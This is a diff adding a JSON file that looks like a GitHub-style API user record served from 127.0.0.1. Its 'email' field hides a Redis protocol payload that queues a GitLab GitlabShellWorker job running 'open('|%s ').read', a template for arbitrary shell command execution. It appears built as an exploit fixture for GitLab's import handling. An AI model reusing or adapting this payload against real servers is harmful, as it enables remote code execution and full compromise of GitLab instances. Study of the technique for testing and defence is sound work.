@@ -1,0 +1,43 @@
+{
+  "login": "wawawa123",
+  "id": 123456,
+  "node_id": "MDQ6VXNlc",
+  "avatar_url": "https://avatars.githubusercontent.com/u/123456?v=4",
+  "gravatar_id": "",
+  "url": "http://127.0.0.1/api/v3/users/wawawa123",
+  "html_url": "http://127.0.0.1/api/v3/wawawa123",
+  "followers_url": "http://127.0.0.1/api/v3/users/wawawa123/followers",
+  "following_url": "http://127.0.0.1/api/v3/users/wawawa123/following{/other_user}",
+  "gists_url": "http://127.0.0.1/api/v3/users/wawawa123/gists{/gist_id}",
+  "starred_url": "http://127.0.0.1/api/v3/users/wawawa123/starred{/owner}{/repo}",
+  "subscriptions_url": "http://127.0.0.1/api/v3/users/wawawa123/subscriptions",
+  "organizations_url": "http://127.0.0.1/api/v3/users/wawawa123/orgs",
+  "repos_url": "http://127.0.0.1/api/v3/users/wawawa123/repos",
+  "events_url": "http://127.0.0.1/api/v3/users/wawawa123/events{/privacy}",
+  "received_events_url": "http://127.0.0.1/api/v3/users/wawawa123/received_events",
+  "type": "User",
+  "site_admin": false,
+  "name": "wawawa123",
+  "company": null,
+  "blog": "",
+  "location": "",
+  "email": {
+    "to_s": {
+      "to_s": {
+        "bytesize": 1,
+        "to_s": "b\r\n$2\r\nEX\r\n$5\r\n86400\r\n*1\r\n$5\r\nmulti\r\n*3\r\n$4\r\nsadd\r\n$20\r\nresque:gitlab:queues\r\n$16\r\nsystem_hook_push\r\n*3\r\n$5\r\nlpush\r\n$36\r\nresque:gitlab:queue:system_hook_push\r\n$%d\r\n{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open('|%s ').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}\r\n*1\r\n$4\r\nexec\r\n*5\r\n$3\r\nset\r\n$6\r\nauthed\r\n$8\r\nby 12345"
+      },
+      "bytesize": 10
+    },
+    "bytesize": 10
+  },
+  "hireable": null,
+  "bio": "a",
+  "twitter_username": null,
+  "public_repos": 102,
+  "public_gists": 0,
+  "followers": 87,
+  "following": 82,
+  "created_at": "2018-09-14T10:13:09Z",
+  "updated_at": "2021-08-27T12:41:05Z"
+}
